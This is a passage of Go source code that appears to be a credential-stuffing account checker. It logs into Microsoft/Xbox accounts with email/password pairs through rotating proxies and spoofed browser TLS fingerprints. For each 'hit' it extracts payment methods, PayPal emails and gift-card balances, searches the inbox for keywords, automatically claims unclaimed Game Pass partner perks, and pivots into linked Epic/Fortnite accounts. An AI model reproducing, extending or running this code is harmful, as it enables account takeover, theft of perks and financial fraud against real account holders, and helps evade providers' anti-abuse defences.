				statusLabel := "Active"
				if isRemoved {
					statusLabel = "Removed"
				}

				var detail string
				lowerType := strings.ToLower(instrType)
				lowerBrand := strings.ToLower(brand)

				if strings.Contains(lowerType, "stored_value") || strings.Contains(lowerType, "gift_card") {
					if details, ok := obj["details"].(map[string]interface{}); ok {
						curr, _ := details["currency"].(string)
						if bal, ok := details["balance"].(float64); ok {
							if bal > 0 {
								detail = fmt.Sprintf("cash: %.2f %s", bal, curr)
							}
						}
					}
				} else if strings.Contains(lowerType, "paypal") || strings.Contains(lowerBrand, "paypal") || (ppEmail != "" && last4 == "") {
					if ppEmail != "" && !strings.Contains(ppEmail, "-") && len(ppEmail) <= 40 && strings.Contains(ppEmail, "@") {
						detail = fmt.Sprintf("PayPal (%s): %s", statusLabel, ppEmail)
					}
				} else if last4 != "" || (brand != "" && brandFromType(pmType) != "") {
					if brand == "" {
						brand = "Card"
					}
					if expMonth == "" {
						expMonth = "N/A"
					}
					if expYear == "" {
						expYear = "N/A"
					}
					// "Visa card 1234" — if the brand already ends with "card", don't double it
					if strings.HasSuffix(strings.ToLower(brand), "card") {
						detail = fmt.Sprintf("%s %s [%s] | Expires: %s/%s", brand, last4, statusLabel, expMonth, expYear)
					} else {
						detail = fmt.Sprintf("%s card %s [%s] | Expires: %s/%s", brand, last4, statusLabel, expMonth, expYear)
					}
				}

				if detail != "" {
					if isRemoved {
						removedMethods = append(removedMethods, detail)
					} else {
						if strings.HasPrefix(detail, "cash:") {
							cashStrs = append(cashStrs, detail)
						} else {
							nonCashActive = append(nonCashActive, detail)
						}
					}
				}
			}
		}
	}

	reqTx, err := http.NewRequest("GET", PaymentTransactionsURL, nil)
	var txStr string
	if err == nil {
		reqTx.Header.Set("Authorization", fmt.Sprintf("MSADELEGATE1.0=\"%s\"", atk))
		reqTx.Header.Set("Accept", "application/json")
		if respTx, err := doReq(client, reqTx); err == nil {
			defer respTx.Body.Close()
			txBytes, _ := io.ReadAll(respTx.Body)
			txStr = string(txBytes)
		}
	}

	services := detectActiveServices(txStr)

	// ---------- Inbox keyword search (additional step) ----------
	keywordResults := ""
	if cfg.CapKeywords && len(keywords) > 0 {
		counts := searchInboxForKeywords(email, password, proxyStr, keywords)
		var parts []string
		for _, kw := range keywords {
			if counts[kw] <= 0 {
				continue
			}
			parts = append(parts, fmt.Sprintf("%s %d", strings.TrimSpace(kw), counts[kw]))
		}
		if len(parts) > 0 {
			keywordResults = "Keywords: " + strings.Join(parts, ", ")
		}
	}

	// Formatting Output
	var middleParts []string
	middleParts = append(middleParts, email)
	middleParts = append(middleParts, password)

	if len(cashStrs) > 0 {
		middleParts = append(middleParts, strings.Join(cashStrs, " | "))
	}

	var activePart string
	if len(nonCashActive) > 0 {
		activePart = fmt.Sprintf("Active: [%s]", strings.Join(nonCashActive, " | "))
	} else {
		activePart = "Active: No Active Payment Methods"
	}
	middleParts = append(middleParts, activePart)

	if len(removedMethods) > 0 {
		removedPart := fmt.Sprintf("Inactive: Removed: [%s]", strings.Join(removedMethods, " | "))
		middleParts = append(middleParts, removedPart)
	}

	middleParts = append(middleParts, fmt.Sprintf("Country: %s", countryName))
	middleParts = append(middleParts, fmt.Sprintf("Services: %s", services))

	if keywordResults != "" {
		middleParts = append(middleParts, keywordResults)
	}

	if cfg.CapPromos {
		if promoLine := checkGamePassPromos(email, password, proxyStr); promoLine != "" {
			middleParts = append(middleParts, promoLine)
		}
	}

	// ---------- Fortnite / Epic locker step ----------
	fnInfo := ""
	if cfg.CapFortnite {
		fnInfo = checkFortniteAccount(email, password, proxyStr)
	}
	start := 0
	if proxyStr != "" && len(proxies) > 0 {
		for i, p := range proxies {
			if p == proxyStr || p == strings.TrimPrefix(strings.TrimPrefix(proxyStr, "http://"), "socks5://") {
				start = i
				break
			}
		}
	}
	if cfg.CapFortnite {
		for attempt := 0; attempt < 3 && fortniteRetryable(fnInfo); attempt++ {
			next := proxyStr
			if len(proxies) > 0 {
				next = proxies[(start+1+attempt)%len(proxies)]
			}
			fnInfo = checkFortniteAccount(email, password, next)
		}
	}
	if fnInfo != "" {
		middleParts = append(middleParts, fnInfo)
	}

	acctType := classifyAccountType(email, proxyStr)
	if acctType != "" {
		middleParts = append(middleParts, "Account Type: "+acctType)
	}

	formattedResult := strings.Join(middleParts, " | ")
	hitKind := "[HIT]"
	if strings.EqualFold(acctType, "Free") {
		hitKind = "[Free Hit]"
	} else if strings.EqualFold(acctType, "Private") {
		hitKind = "[Private Hit]"
	}
	return formattedResult, true, fmt.Sprintf("%s Successful validation for %s", hitKind, email), false
}

func isPort(s string) bool {
	if s == "" {
		return false
	}
	for _, r := range s {
		if r < '0' || r > '9' {
			return false
		}
	}
	return true
}

func proxyUserinfo(user, pass string) string {
	if pass == "" {
		return url.User(user).String()
	}
	return url.UserPassword(user, pass).String()
}

// formatProxyURL turns every common list format into a URL tls-client can use
// as an HTTP CONNECT proxy (HAProxy http/connect mode) or SOCKS.
//
// Accepted:
//
//	http://user:pass@host:port
//	socks5://user:pass@host:port
//	user:pass@host:port
//	host:port
//	host:port:user:pass
//	user:pass:host:port
func formatProxyURL(proxyStr string) string {
	proxyStr = strings.TrimSpace(proxyStr)
	if proxyStr == "" {
		return ""
	}
	proxyStr = strings.TrimPrefix(proxyStr, "\ufeff")

	scheme := "http"
	low := strings.ToLower(proxyStr)
	switch {
	case strings.HasPrefix(low, "https://"):
		scheme = "http" // CONNECT still speaks HTTP to the proxy
		proxyStr = proxyStr[len("https://"):]
	case strings.HasPrefix(low, "http://"):
		scheme = "http"
		proxyStr = proxyStr[len("http://"):]
	case strings.HasPrefix(low, "socks5h://"):
		scheme = "socks5"
		proxyStr = proxyStr[len("socks5h://"):]
	case strings.HasPrefix(low, "socks5://"):
		scheme = "socks5"
		proxyStr = proxyStr[len("socks5://"):]
	case strings.HasPrefix(low, "socks4://"):
		scheme = "socks4"
		proxyStr = proxyStr[len("socks4://"):]
	}

	host, port, user, pass := "", "", "", ""

	if at := strings.LastIndex(proxyStr, "@"); at >= 0 {
		cred := proxyStr[:at]
		hp := proxyStr[at+1:]
		if i := strings.Index(cred, ":"); i >= 0 {
			user, pass = cred[:i], cred[i+1:]
		} else {
			user = cred
		}
		host, port = splitHostPort(hp)
	} else {
		parts := strings.Split(proxyStr, ":")
		switch len(parts) {
		case 2:
			host, port = parts[0], parts[1]
		case 3:
			// host:port:user
			if isPort(parts[1]) {
				host, port, user = parts[0], parts[1], parts[2]
			} else if isPort(parts[2]) {
				user, host, port = parts[0], parts[1], parts[2]
			} else {
				host, port = parts[0], parts[1]
			}
		case 4:
			if isPort(parts[1]) {
				// host:port:user:pass
				host, port, user, pass = parts[0], parts[1], parts[2], parts[3]
			} else if isPort(parts[3]) {
				// user:pass:host:port
				user, pass, host, port = parts[0], parts[1], parts[2], parts[3]
			} else {
				host, port = parts[0], parts[1]
			}
		default:
			if len(parts) > 4 && isPort(parts[1]) {
				host, port = parts[0], parts[1]
				user = parts[2]
				pass = strings.Join(parts[3:], ":")
			} else if len(parts) > 4 && isPort(parts[len(parts)-1]) {
				port = parts[len(parts)-1]
				host = parts[len(parts)-2]
				user = parts[0]
				pass = strings.Join(parts[1:len(parts)-2], ":")
			} else {
				return scheme + "://" + proxyStr
			}
		}
	}

	host = strings.TrimSpace(host)
	port = strings.TrimSpace(port)
	if host == "" {
		return ""
	}
	addr := host
	if port != "" {
		addr = net.JoinHostPort(host, port)
	}
	if user != "" {
		return scheme + "://" + proxyUserinfo(user, pass) + "@" + addr
	}
	return scheme + "://" + addr
}

func splitHostPort(hp string) (string, string) {
	hp = strings.TrimSpace(hp)
	if hp == "" {
		return "", ""
	}
	if h, p, err := net.SplitHostPort(hp); err == nil {
		return h, p
	}
	// host only, or host:port that failed (e.g. missing port)
	if i := strings.LastIndex(hp, ":"); i > 0 && isPort(hp[i+1:]) {
		return hp[:i], hp[i+1:]
	}
	return hp, ""
}

// Browser JA3/H2 fingerprints shipped by bogdanfinn/tls-client v1.7.x.
// Each worker starts on a different profile; each new client on that worker
// advances to the next fingerprint so traffic is not pinned to one Chrome build.
type tlsPreset struct {
	profile profiles.ClientProfile
	ua      string
}

var tlsPresets = []tlsPreset{
	{profiles.Chrome_117, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"},
	{profiles.Chrome_120, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"},
	{profiles.Chrome_124, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"},
	{profiles.Firefox_117, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0"},
	{profiles.Firefox_120, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0"},
	{profiles.Firefox_123, "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"},
	{profiles.Safari_16_0, "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"},
	{profiles.Safari_IOS_16_0, "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1"},
	{profiles.Safari_IOS_17_0, "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"},
	{profiles.Opera_91, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/91.0.4516.20"},
}

var tlsProfileIdx uint64

type workerFP struct {
	id int
	n  uint64
}

func newWorkerFP(id int) *workerFP {
	return &workerFP{id: id}
}

func (w *workerFP) nextPreset() tlsPreset {
	if w == nil {
		return nextTLSPreset()
	}
	if len(tlsPresets) == 0 {
		return tlsPreset{profile: profiles.DefaultClientProfile, ua: profileUserAgent(profiles.DefaultClientProfile)}
	}
	i := atomic.AddUint64(&w.n, 1) - 1
	return tlsPresets[int((uint64(w.id)+i)%uint64(len(tlsPresets)))]
}

func (w *workerFP) nextProfile() profiles.ClientProfile {
	return w.nextPreset().profile
}

func nextTLSPreset() tlsPreset {
	if len(tlsPresets) == 0 {
		return tlsPreset{profile: profiles.DefaultClientProfile, ua: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
	}
	i := atomic.AddUint64(&tlsProfileIdx, 1) - 1
	return tlsPresets[int(i%uint64(len(tlsPresets)))]
}

func nextTLSProfile() profiles.ClientProfile {
	return nextTLSPreset().profile
}

func profileUserAgent(p profiles.ClientProfile) string {
	// ClientProfile contains maps and is not comparable with ==.
	// The library exposes the hello id via GetClientHelloStr().
	id := p.GetClientHelloStr()
	for _, pre := range tlsPresets {
		if pre.profile.GetClientHelloStr() == id {
			return pre.ua
		}
	}
	return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
}

func newTLSClient(proxyStr string, timeout time.Duration, followRedirect bool) tls_client.HttpClient {
	return newTLSClientProfile(proxyStr, timeout, followRedirect, nextTLSProfile())
}

func newTLSClientProfile(proxyStr string, timeout time.Duration, followRedirect bool, profile profiles.ClientProfile) tls_client.HttpClient {
	jar := tls_client.NewCookieJar()
	secs := int(timeout / time.Second)
	if secs < 1 {
		secs = 5
	}
	opts := []tls_client.HttpClientOption{
		tls_client.WithTimeoutSeconds(secs),
		tls_client.WithClientProfile(profile),
		tls_client.WithCookieJar(jar),
		tls_client.WithInsecureSkipVerify(),
		tls_client.WithRandomTLSExtensionOrder(),
	}
	if !followRedirect {
		opts = append(opts, tls_client.WithNotFollowRedirects())
	}
	if p := formatProxyURL(proxyStr); p != "" {
		opts = append(opts, tls_client.WithProxyUrl(p))
	}
	c, err := tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
	if err != nil {
		opts[1] = tls_client.WithClientProfile(profiles.DefaultClientProfile)
		c, err = tls_client.NewHttpClient(tls_client.NewNoopLogger(), opts...)
		if err != nil {
			return nil
		}
	}
	return c
}

func newTLSClientPair(proxyStr string, followTimeout, noRedirTimeout time.Duration) (tls_client.HttpClient, tls_client.HttpClient) {
	return newTLSClientPairProfile(proxyStr, followTimeout, noRedirTimeout, nextTLSProfile())
}

func newTLSClientPairProfile(proxyStr string, followTimeout, noRedirTimeout time.Duration, profile profiles.ClientProfile) (tls_client.HttpClient, tls_client.HttpClient) {
	follow := newTLSClientProfile(proxyStr, followTimeout, true, profile)
	noRedir := newTLSClientProfile(proxyStr, noRedirTimeout, false, profile)
	if follow == nil || noRedir == nil {
		return follow, noRedir
	}
	noRedir.SetCookieJar(follow.GetCookieJar())
	return follow, noRedir
}

func newProxyClient(proxyStr string, timeout time.Duration, followRedirect bool) tls_client.HttpClient {
	return newTLSClient(proxyStr, timeout, followRedirect)
}

func doReq(c tls_client.HttpClient, req *http.Request) (*http.Response, error) {
	if c == nil {
		return nil, fmt.Errorf("tls client is nil")
	}
	return c.Do(req)
}

var knownPerkTitles = map[string]string{
	"6870AAC98E444CD69D948BD07D2D33B6": "3 Months Discord Nitro",
	"39FEA8F9C18B4222BF36A0D7BF5B28D7": "Discord Orbs",
	"B6621BB197A84B0BB19354D651137060": "40% Off DoorDash",
	"9A43D6C5573F4048BBEFC258A719BB4E": "15% Off Xbox Design Lab",
	"E27CEEB694544FAA8FB4EB0D590A731E": "FuboTV Xbox Perks",
	"543D5AE194C947CE8BF599F456C71A27": "Super Animal Royale Summer 2026 Pack",
	"A085ECDBC3B44E02956D55AFEED6DAEB": "Disney Speedstorm Stitch Suit",
	"2BAE856D8BBD4652872E7A566DFE1B12": "PSO2 New Genesis Monthly Items",
	"EE0E30590A954DA482382E71BE5A44D4": "Star Trek Online Captain's Edition",
	"E6D9E945214340C087B15373C0418E77": "Rainbow Six Siege IQ Verbena Bundle",
}

// Titles pulled from offer API / claim response when id is not in the map yet.
var knownPerkTitleHints = []struct {
	sub   string
	title string
}{
	{"delta force", "Delta Force - Season 11 Benefits Pack"},
	{"deltaforce", "Delta Force - Season 11 Benefits Pack"},
}

func extractOfferTitle(m map[string]interface{}) string {
	if m == nil {
		return ""
	}
	keys := []string{
		"title", "Title", "productTitle", "ProductTitle", "displayName", "DisplayName",
		"name", "Name", "localizedTitle", "offerTitle", "OfferTitle", "friendlyName",
		"description", "Description",
	}
	for _, k := range keys {
		if s, ok := m[k].(string); ok {
			s = strings.TrimSpace(s)
			if s != "" && len(s) < 120 {
				return s
			}
		}
	}
	// nested product / localization blobs
	for _, nk := range []string{"product", "Product", "localizedStrings", "LocalizedStrings"} {
		if sub, ok := m[nk].(map[string]interface{}); ok {
			if t := extractOfferTitle(sub); t != "" {
				return t
			}
		}
	}
	return ""
}

func isGenericPerkTitle(s string) bool {
	low := strings.ToLower(strings.TrimSpace(s))
	switch low {
	case "", "store token", "token", "perk", "offer", "product", "null", "undefined", "xbox store code", "store":
		return true
	}
	return false
}

func promoTitle(offerID, resource, apiTitle string) string {
	apiTitle = strings.TrimSpace(apiTitle)
	offerID = strings.ToUpper(strings.TrimSpace(offerID))
	// Prefer explicit ID map first (covers store-token style claims)
	if t, ok := knownPerkTitles[offerID]; ok {
		return t
	}
	if apiTitle != "" && !isGenericPerkTitle(apiTitle) {
		low := strings.ToLower(apiTitle)
		for _, h := range knownPerkTitleHints {
			if strings.Contains(low, h.sub) {
				return h.title
			}
		}
		return apiTitle
	}
	res := strings.TrimSpace(resource)
	low := strings.ToLower(res + " " + apiTitle)
	switch {
	case strings.Contains(low, "promos.discord"):
		return "3 Months Discord Nitro"
	case strings.Contains(low, "discord.com/settings/connections"):
		return "Discord Orbs"
	case strings.Contains(low, "discord"):
		return "Discord Perk"
	case strings.Contains(low, "doordash"):
		return "40% Off DoorDash"
	case strings.Contains(low, "fubo"):
		return "FuboTV Xbox Perks"
	case strings.Contains(low, "spotify"):
		return "Spotify"
	case strings.Contains(low, "netflix"):
		return "Netflix"
	case strings.Contains(low, "delta force"), strings.Contains(low, "deltaforce"):
		return "Delta Force - Season 11 Benefits Pack"
	case strings.Contains(low, "xgp_xdl"), strings.Contains(low, "design-lab"), strings.Contains(low, "designlab"), strings.Contains(low, "game-pass-member-offer"):
		return "15% Off Xbox Design Lab"
	case regexp.MustCompile(`(?i)^[A-Z0-9]{5}(-[A-Z0-9]{5}){4}$`).MatchString(res):
		// 5x5 Xbox store code with no title from API
		return "Xbox Store code"
	default:
		if u, err := url.Parse(res); err == nil && u.Host != "" {
			return strings.TrimPrefix(u.Host, "www.")
		}
		return "Perk"
	}
}

// checkGamePassPromos claims only still-available Game Pass partner offers
// and returns "Promos: Name [code/link], ...". Already-claimed offers are skipped.
func checkGamePassPromos(email, password, proxyStr string) string {
	preset := nextTLSPreset()
	client, noRedir := newTLSClientPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.profile)
	if client == nil || noRedir == nil {
		return ""
	}
	ua := preset.ua

	pre := "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&response_type=token&scope=service::user.auth.xboxlive.com::MBI_SSL"
	req, err := http.NewRequest("GET", pre, nil)
	if err != nil {
		return ""
	}
	req.Header.Set("User-Agent", ua)
	resp, err := doReq(client, req)
	if err != nil {
		return ""
	}
	b, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ppft := extractPPFT(string(b))
	if ppft == "" {
		return ""
	}
	form := url.Values{}
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("passwd", password)
	form.Set("PPFT", ppft)
	form.Set("type", "11")
	form.Set("LoginOptions", "3")
	form.Set("ps", "2")
	req2, _ := http.NewRequest("POST", "https://login.live.com/ppsecure/post.srf?client_id=00000000402B5328", strings.NewReader(form.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("User-Agent", ua)
	resp2, err := doReq(client, req2)
	if err != nil {
		return ""
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	authURL := pre + "&prompt=none"
	req3, _ := http.NewRequest("GET", authURL, nil)
	req3.Header.Set("User-Agent", ua)
	resp3, err := doReq(noRedir, req3)
	if err != nil {
		return ""
	}
	b3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	loc := resp3.Header.Get("Location")
	if loc == "" {
		loc = resp3.Request.URL.String()
	}
	msa := extractParameter(loc+"\n"+string(b3), "access_token=")
	if decoded, err := url.QueryUnescape(msa); err == nil && decoded != "" {
		msa = decoded
	}
	if msa == "" {
		return ""
	}

	userBody := fmt.Sprintf(`{"Properties":{"AuthMethod":"RPS","SiteName":"user.auth.xboxlive.com","RpsTicket":%q},"RelyingParty":"http://auth.xboxlive.com","TokenType":"JWT"}`, msa)
	reqU, _ := http.NewRequest("POST", "https://user.auth.xboxlive.com/user/authenticate", strings.NewReader(userBody))
	reqU.Header.Set("Content-Type", "application/json")
	reqU.Header.Set("Accept", "application/json")
	respU, err := doReq(client, reqU)
	if err != nil {
		return ""
	}
	bu, _ := io.ReadAll(respU.Body)
	respU.Body.Close()
	xToken := extractJSONString(string(bu), "Token")
	uhs := extractParameter(string(bu), `"uhs":"`)
	if xToken == "" || uhs == "" {
		return ""
	}

	xstsBody := fmt.Sprintf(`{"Properties":{"SandboxId":"RETAIL","UserTokens":[%q]},"RelyingParty":"http://xboxlive.com","TokenType":"JWT"}`, xToken)
	reqX, _ := http.NewRequest("POST", "https://xsts.auth.xboxlive.com/xsts/authorize", strings.NewReader(xstsBody))
	reqX.Header.Set("Content-Type", "application/json")
	reqX.Header.Set("Accept", "application/json")
	respX, err := doReq(client, reqX)
	if err != nil {
		return ""
	}
	bx, _ := io.ReadAll(respX.Body)
	respX.Body.Close()
	xsts := extractJSONString(string(bx), "Token")
	if xsts == "" {
		return ""
	}
	xbl := "XBL3.0 x=" + uhs + ";" + xsts

	reqO, _ := http.NewRequest("GET", "https://profile.gamepass.com/v2/offers", nil)
	reqO.Header.Set("authorization", xbl)
	reqO.Header.Set("Accept", "application/json")
	respO, err := doReq(client, reqO)
	if err != nil {
		return ""
	}
	bo, _ := io.ReadAll(respO.Body)
	respO.Body.Close()

	var root map[string]interface{}
	if json.Unmarshal(bo, &root) != nil {
		return ""
	}
	arr, _ := root["offers"].([]interface{})
	var fresh, claimed []string
	seen := map[string]bool{}
	add := func(dst *[]string, offerID, resource, apiTitle string) {
		resource = strings.TrimSpace(resource)
		if resource == "" || seen[resource] {
			return
		}
		seen[resource] = true
		*dst = append(*dst, fmt.Sprintf("%s [%s]", promoTitle(offerID, resource, apiTitle), resource))
	}
	for _, raw := range arr {
		off, ok := raw.(map[string]interface{})
		if !ok {
			continue
		}
		status, _ := off["offerStatus"].(string)
		res, _ := off["resource"].(string)
		oid, _ := off["offerId"].(string)
		apiTitle := extractOfferTitle(off)
		switch strings.ToLower(status) {
		case "claimed":
			add(&claimed, oid, res, apiTitle)
		case "available":
			if oid == "" {
				continue
			}
			reqC, _ := http.NewRequest("POST", "https://profile.gamepass.com/v2/offers/"+oid, strings.NewReader("{}"))
			reqC.Header.Set("authorization", xbl)
			reqC.Header.Set("Content-Type", "application/json")
			reqC.Header.Set("Accept", "application/json")
			respC, err := doReq(client, reqC)
			if err != nil {
				continue
			}
			bc, _ := io.ReadAll(respC.Body)
			respC.Body.Close()
			var claim map[string]interface{}
			_ = json.Unmarshal(bc, &claim)
			resource := extractJSONString(string(bc), "resource")
			if resource == "" {
				resource = res
			}
			claimTitle := extractOfferTitle(claim)
			if claimTitle == "" {
				claimTitle = apiTitle
			}
			// Persist title by offer id when we learn it
			if claimTitle != "" && oid != "" {
				knownPerkTitles[strings.ToUpper(oid)] = promoTitle(oid, resource, claimTitle)
			}
			add(&fresh, oid, resource, claimTitle)
		}
	}
	var out []string
	if len(fresh) > 0 {
		out = append(out, "Promos: "+strings.Join(fresh, ", "))
	}
	if len(claimed) > 0 {
		out = append(out, "Claimed Promos: "+strings.Join(claimed, ", "))
	}
	return strings.Join(out, " | ")
}

func fortniteRetryable(info string) bool {
	return strings.Contains(info, "Check failed") ||
		strings.Contains(info, "CSRF") ||
		strings.Contains(info, "Bad code")
}

// checkFortniteAccount logs into Epic via Xbox/Microsoft (config flow) and
// pulls Fortnite locker stats. Always returns a "Fortnite: ..." field.
func checkFortniteAccount(email, password, proxyStr string) string {
	preset := nextTLSPreset()
	client, noRedir := newTLSClientPairProfile(proxyStr, 30*time.Second, 25*time.Second, preset.profile)
	if client == nil || noRedir == nil {
		return "Fortnite: Check failed"
	}
	jar := client.GetCookieJar()
	ua := preset.ua

	// 1) Xbox/Microsoft login then grab the SISU auth code Epic XBL login expects
	req, err := http.NewRequest("GET", XboxAuthPreflight, nil)
	if err != nil {
		return "Fortnite: Check failed"
	}
	req.Header.Set("User-Agent", ua)
	resp, err := doReq(client, req)
	if err != nil {
		return "Fortnite: Check failed"
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	ppft := extractPPFT(string(body))
	if ppft == "" {
		return "Fortnite: Check failed"
	}

	form := url.Values{}
	form.Set("i13", "0")
	form.Set("login", email)
	form.Set("loginfmt", email)
	form.Set("type", "11")
	form.Set("LoginOptions", "3")
	form.Set("passwd", password)
	form.Set("ps", "2")
	form.Set("PPFT", ppft)
	form.Set("NewUser", "1")
	form.Set("IsFidoSupported", "1")
	form.Set("i19", "36463")
	req2, _ := http.NewRequest("POST", XboxLoginPost, strings.NewReader(form.Encode()))
	req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req2.Header.Set("Origin", "https://login.live.com")
	req2.Header.Set("User-Agent", ua)
	resp2, err := doReq(client, req2)
	if err != nil {
		return "Fortnite: Check failed"
	}
	io.Copy(io.Discard, resp2.Body)
	resp2.Body.Close()

	// Epic XBL login rejects the SISU XboxLive code. It wants a code from
	// Epic's Microsoft Xbox app (client 82023151-c27d-4fb5-8551-10c10724a55e).
	epicXblAuth := "https://login.live.com/oauth20_authorize.srf?" + url.Values{
		"client_id":      {"82023151-c27d-4fb5-8551-10c10724a55e"},
		"redirect_uri":   {"https://accounts.epicgames.com/OAuthAuthorized"},
		"scope":          {"xboxlive.signin"},
		"response_type":  {"code"},
		"display":        {"popup"},
		"force_verify":   {"true"},
		"service_entity": {"undefined"},
		"prompt":         {"none"},
	}.Encode()
	req3, _ := http.NewRequest("GET", epicXblAuth, nil)
	req3.Header.Set("User-Agent", ua)
	resp3, err := doReq(noRedir, req3)
	if err != nil {
		return "Fortnite: Check failed"
	}
	b3, _ := io.ReadAll(resp3.Body)
	resp3.Body.Close()
	loc := resp3.Header.Get("Location")
	code := extractParameter(loc+"\n"+string(b3), "code=")
	if decoded, err := url.QueryUnescape(code); err == nil && decoded != "" {
		code = decoded
	}
	if code == "" {
		low := strings.ToLower(loc)
		if strings.Contains(low, "consent_required") ||
			strings.Contains(low, "login_required") ||
			strings.Contains(low, "interaction_required") ||
			strings.Contains(low, "access_denied") {
			return "Fortnite: No Account"
		}
		return "Fortnite: No Account"
	}

	// 2) Epic CSRF (token cookie is Path=/id)
	reqC, _ := http.NewRequest("GET", "https://www.epicgames.com/id/api/csrf", nil)
	reqC.Header.Set("User-Agent", ua)
	reqC.Header.Set("Accept", "application/json, text/plain, */*")
	if respC, err := doReq(client, reqC); err == nil {
		io.Copy(io.Discard, respC.Body)
		respC.Body.Close()
	}
	xsrf := cookieValue(jar, "https://www.epicgames.com/id/api/csrf", "XSRF-TOKEN")
	if xsrf == "" {
		xsrf = cookieValue(jar, "https://www.epicgames.com/id/login", "XSRF-TOKEN")
	}

	// 3) Login to Epic with the Microsoft/Xbox code
	xblBody := fmt.Sprintf(`{"code":%q}`, code)
	reqX, _ := http.NewRequest("POST", EpicXBLLoginURL, strings.NewReader(xblBody))
	reqX.Header.Set("Content-Type", "application/json;charset=UTF-8")
	reqX.Header.Set("Accept", "application/json, text/plain, */*")
	reqX.Header.Set("User-Agent", ua)
	reqX.Header.Set("X-Requested-With", "XMLHttpRequest")
	reqX.Header.Set("Origin", "https://www.epicgames.com")
	reqX.Header.Set("Referer", "https://www.epicgames.com/id/login/xbl")
	if xsrf != "" {
		reqX.Header.Set("X-XSRF-TOKEN", xsrf)
		reqX.Header.Set("X-Xsrf-Token", xsrf)
	}
	respX, err := doReq(client, reqX)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bx, _ := io.ReadAll(respX.Body)
	respX.Body.Close()
	sx := string(bx)
	if strings.Contains(sx, "Two-Factor") || strings.Contains(sx, "twoFactor") || strings.Contains(sx, "two_factor_authentication") {
		return "Fortnite: 2FA"
	}
	if strings.Contains(sx, "No account was found") || strings.Contains(sx, "DATE_OF_BIRTH") ||
		strings.Contains(sx, "link_account_not_allowed") {
		return "Fortnite: No Account"
	}
	if ec := extractJSONString(sx, "errorCode"); ec != "" {
		switch {
		case strings.Contains(ec, "csrf"):
			return "Fortnite: CSRF"
		case strings.Contains(ec, "invalid_grant"):
			return "Fortnite: Bad code"
		default:
			return "Fortnite: No Account"
		}
	}

	// 4) Get exchange code from Epic session
	reqEx, _ := http.NewRequest("GET", EpicRedirectURL, nil)
	reqEx.Header.Set("Accept", "application/json, text/plain, */*")
	reqEx.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) EpicGamesLauncher/16.7.0-34134031+++Portal+Release-Live UnrealEngine/4.27.0-34134031+++Portal+Release-Live Chrome/90.0.4430.212 Safari/537.36")
	reqEx.Header.Set("X-Requested-With", "XMLHttpRequest")
	if xsrf != "" {
		reqEx.Header.Set("X-XSRF-TOKEN", xsrf)
	}
	respEx, err := doReq(client, reqEx)
	if err != nil {
		return "Fortnite: No Account"
	}
	bex, _ := io.ReadAll(respEx.Body)
	respEx.Body.Close()
	ex := extractJSONString(string(bex), "exchangeCode")
	if ex == "" {
		ex = extractParameter(string(bex), "\"exchangeCode\":\"")
		ex = strings.Trim(ex, `"`)
	}
	if ex == "" {
		return "Fortnite: No Account"
	}

	// 5) Exchange -> launcher token
	tokForm := url.Values{}
	tokForm.Set("grant_type", "exchange_code")
	tokForm.Set("exchange_code", ex)
	tokForm.Set("token_type", "eg1")
	reqT, _ := http.NewRequest("POST", "https://account-public-service-prod.ak.epicgames.com/account/api/oauth/token", strings.NewReader(tokForm.Encode()))
	reqT.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	reqT.Header.Set("Authorization", EpicLauncherAuth)
	reqT.Header.Set("User-Agent", "UELauncher/16.7.0-34134031+++Portal+Release-Live Windows/10.0.19045.1.256.64bit")
	respT, err := doReq(client, reqT)
	if err != nil {
		return "Fortnite: Check failed"
	}
	bt, _ := io.ReadAll(respT.Body)
	respT.Body.Close()
	at1 := extractJSONString(string(bt), "access_token")
	accID := extractJSONString(string(bt), "account_id")
	if at1 == "" {
		return "Fortnite: No Account"
	}

	// 6) Launcher token -> Fortnite client token
	reqE2, _ := http.NewRequest("GET", "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange", nil)
	reqE2.Header.Set("Authorization", "bearer "+at1)
	reqE2.Header.Set("User-Agent", ua)
	respE2, err := doReq(client, reqE2)
	if err != nil {
		return "Fortnite: Check failed"
	}
